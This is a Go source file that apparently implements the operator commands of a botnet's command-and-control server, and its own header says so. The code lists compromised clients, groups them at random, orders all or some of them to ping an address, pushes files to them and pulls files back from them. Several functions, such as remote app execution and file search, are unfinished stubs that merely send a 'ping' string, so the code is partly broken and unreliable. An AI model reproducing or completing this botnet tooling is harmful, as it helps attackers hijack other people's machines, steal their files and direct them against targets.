package connection

import (
	"fmt"
	"net"
	h "server/util/header"
)

/*
*All the commands that the botnet can run
 */

//*Shows number of all active connection to server
func (s *Server)ShowActiveConns(){
	s.mu.Lock()
	defer s.mu.Unlock()
	fmt.Println(h.I, s.Activeconns, "Client(s) currently connected")
}

//*Lists all client IPs connected to the server
func (s *Server) ListClients() {
	s.mu.Lock()
	defer s.mu.Unlock()
	
	if len(s.Clients) == 0 {
		fmt.Println(h.E, "No Clients")
		return
	}
	
	fmt.Println(h.I, "Current Clients:")
	for _, client := range s.Clients {
		remoteAddr := client.Conn.RemoteAddr().String()

		disconnected := false
		select {
		case <-s.DisconnectedClients:
			disconnected = true
		default:
		}

		if !disconnected {
			fmt.Printf("\t"+h.L+" Client %d: %s\n", client.ID, remoteAddr)
		}
	}
}


//*Makes the selected ID the active Client
func (s *Server)SelectActiveClient(ID int64, conn net.Conn){
	if ID >= 0{
		s.ActiveClient = ID
		fmt.Println(h.K, "Active Client is now:", s.ActiveClient)
	}else{
		fmt.Println(h.E, "Invalid number")
	}
}

//*Prints current active client
func (s *Server)CheckActiveClient(conn net.Conn){
	fmt.Println(h.I, "Current Active Client", s.ActiveClient)
}



/*
* Creates a group of Clients of amount size
* random clients are selected to be part of the group
*/
func (s *Server)SetClientGroup(amount int, conn net.Conn){	
	if amount < 0{
		fmt.Println(h.E, "Invalid amount")
		return
	}
	shuffledClients := s.Clients
	
	ShuffleList(shuffledClients)
	
	var newGroup []int64

	for i := 0; i< amount && i < len(shuffledClients); i++{
		newGroup = append(newGroup, shuffledClients[i].ID)
	}
	
	s.ClientGroup = newGroup

	fmt.Println(h.K, "random client group assigned")
}



//*Prints the current active client group
func (s *Server)CheckClientGroup(conn net.Conn){
	if len(s.ClientGroup) == 0{
		fmt.Println(h.E, "The Client Group is empty")
		return
	}


	fmt.Println(h.I, "Current Client Group Members:")
	for _, c := range(s.ClientGroup){
		fmt.Println("\t", h.L, "Client:", c)
	}
}


//*Pings address specified by input
func (s *Server) ClientPing(addr, mode string, conn net.Conn) {
	s.mu.Lock()
	defer s.mu.Unlock()

	switch{
	
	case mode == "-a":
		for _, client := range s.Clients {
			if client.ID == s.ActiveClient {
				if _, err := client.Conn.Write([]byte("ping " + addr)); err != nil {
					fmt.Println(h.E, "Error sending ping to active client:", err)
				} else {
					fmt.Println(h.K, "Ping sent to active client", s.ActiveClient, "successfully.")
				}
				break
			}
		}
	
	case len(s.ClientGroup) > 0 && mode == "-g":
		for _, client := range s.Clients {
			for _, clientID := range s.ClientGroup {
				if client.ID == clientID {
					if _, err := client.Conn.Write([]byte("ping " + addr)); err != nil {
						fmt.Println(h.E, "Error sending ping to client", client.ID, ":", err)
					} else {
						fmt.Println(h.K, "Ping sent to client", client.ID, "successfully.")
					}
				}
			}
		}
		fmt.Println(h.K, "Ping Sent to group successfully")
	

	default:
		for _, client := range s.Clients {
			if _, err := client.Conn.Write([]byte("ping " + addr)); err != nil {
				fmt.Println(h.E, "Error sending ping to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, "Ping sent to client", client.ID, "successfully.")
			}
		}
	}
	
}


//*Runs specified app on detected os by abs path on client side
func (s *Server)ClientRunApp(app, mode string, conn net.Conn){
	/*
	TODO:
	1. check mode
	2. detect os on client
	3. parse for file -> can run find file or implement own logic
	4. run file
	*/
	if s.ActiveClient == 0{
		if _, err := conn.Write([]byte("ping " + app)); err != nil {
				fmt.Println(h.E, err)
		}
		fmt.Println(h.K, "successful execution")
	}
}

//*Sends a file to client side
func (s *Server)ServerSendFile(file, mode string, conn net.Conn){
	/*
	TODO:
	* 1. check mode DONE
	2. download file and make buffer for file size -> 
	3. send file over tcp -> 
	4. confirm that it was sent
	*/
	s.mu.Lock()
	defer s.mu.Unlock()

	switch{
	
	case mode == "-a":
		for _, client := range s.Clients {
			if client.ID == s.ActiveClient {
				if err := s.SendFileToClient(file, client); err != nil {
					fmt.Println(h.E, "Error sending file to active client:", err)
				} else {
					fmt.Println(h.K, "File sent to active client", s.ActiveClient, "successfully.")
				}
				break
			}
		}
	
	case len(s.ClientGroup) > 0 && mode == "-g":
		for _, client := range s.Clients {
			for _, clientID := range s.ClientGroup {
				if client.ID == clientID {
					if err := s.SendFileToClient(file, client); err != nil {
						fmt.Println(h.E, "Error sending file to client", client.ID, ":", err)
					} else {
						fmt.Println(h.K, "File sent to client", client.ID, "successfully.")
					}
				}
			}
		}
		fmt.Println(h.K, "File Sent to group successfully")
	

	default:
		for _, client := range s.Clients {
			if err := s.SendFileToClient(file, client); err != nil {
				fmt.Println(h.E, "Error sending file to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, "File sent to client", client.ID, "successfully.")
			}
		}
	}
}

//*Searches for a file on the client side
func (s *Server)ClientSearchFile(file, mode string, conn net.Conn){
	/*
	TODO:
	1. check mode
	2. check OS
	3. parse through file system at entry point (use ClientEntry Point to see if we can go there)
	4. if found print found if not print not
	*/
	if s.ActiveClient == 0{
		if _, err := conn.Write([]byte("ping " + file)); err != nil {
				fmt.Println(h.E, err)
		}
		fmt.Println(h.K, "successful execution")
	}
}

//*Tells client to return the current path that they are located in
func (s *Server)ClientEntryPoint(mode string, conn net.Conn){
	/*
	TODO:
	1. check mode
	2. check os
	3. tell client to return their current path
	*/
}


//*Downloads a file from client side to Server side
func (s *Server)ClientDownFile(file, mode string, conn net.Conn){
	/*
	TODO:
	1. check mode
	2. check os
	3. tell the client to send a file at specified path (use ClientSearchFile to see if exist then go there)
	*/
	
	s.mu.Lock()
	defer s.mu.Unlock()

	switch{
	
	case mode == "-a":
		for _, client := range s.Clients {
			if client.ID == s.ActiveClient {
				if err := s.RecvFileFromClient(client); err != nil {
					fmt.Println(h.E, "Error sending file to active client:", err)
				} else {
					fmt.Println(h.K, "File sent to active client", s.ActiveClient, "successfully.")
				}
				break
			}
		}
	
	case len(s.ClientGroup) > 0 && mode == "-g":
		for _, client := range s.Clients {
			for _, clientID := range s.ClientGroup {
				if client.ID == clientID {
					if err := s.RecvFileFromClient(client); err != nil {
						fmt.Println(h.E, "Error sending file to client", client.ID, ":", err)
					} else {
						fmt.Println(h.K, "File sent to client", client.ID, "successfully.")
					}
				}
			}
		}
		fmt.Println(h.K, "File Sent to group successfully")
	

	default:
		for _, client := range s.Clients {
			if err := s.RecvFileFromClient(client); err != nil {
				fmt.Println(h.E, "Error sending file to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, "File sent to client", client.ID, "successfully.")
			}
		}
	}
}